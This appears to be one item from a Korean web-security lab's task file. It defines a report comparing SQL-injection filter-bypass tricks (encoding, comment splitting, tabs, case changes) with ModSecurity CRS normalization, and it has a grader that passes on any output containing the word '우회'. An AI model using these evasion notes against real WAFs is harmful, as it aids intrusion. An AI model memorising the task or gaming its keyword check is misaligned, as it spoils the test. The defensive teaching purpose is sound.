+    answer_detail: "편집기로 ~/w10_report.md 를 작성해 필터 우회 vs 정규화(표현 다양화 vs 표현 통일)를 종합한다. CRS 정규화(urlDecodeUni/compressWhitespace/lowercase)가 단순 우회(인코딩/탭/대소문자)를 이긴다(모두 942 수렴 403), 단 주석분할은 libinjection 빈틈으로 302 우회. 고급 우회는 파서 차이·HPP 를 악용하나 환경 특이적이라 어렵다. 근본 방어는 코드 수정(파라미터 바인딩). 보고서는 heredoc 출력이 아니라 편집기로 직접 쓴 산출물이라야 하며, 출력에 '우회' 가 보이면 통과."
+    expected_output: |
+      # 공격 W10 — 필터 우회 vs 정규화 보고서
+      ## 1. 기준 : 평문 SQLi 403. 우회 시도 : 이중인코딩/부분인코딩/주석분할/탭/대소문자
+      ## 2. 정규화 : CRS transformation(urlDecodeUni/compressWhitespace/lowercase)으로 표현 통일
+      ## 3. 결과 : 인코딩·탭·대소문자=차단(403, 942 수렴), 주석분할=우회(302, libinjection 빈틈)
+      ## 4. 한계 : 단순 우회 무력, 고급은 파서 차이·HPP(환경 특이적)
+      ## 결론 : 같은 공격을 다르게 표현해도 정규화가 통일 → 단순 우회는 CRS가 이긴다. 근본은 코드 수정
+    verify:
+      type: output_contains
+      expect: '우회'
+      field: stdout
+      semantic:
+        intent: "필터 우회 종합 보고"
+        success_criteria: ["우회 시도/정규화/한계"]
+        acceptable_methods: ["**[관리적] 우회 보고서 (권장)**"]
+    target_vm: web
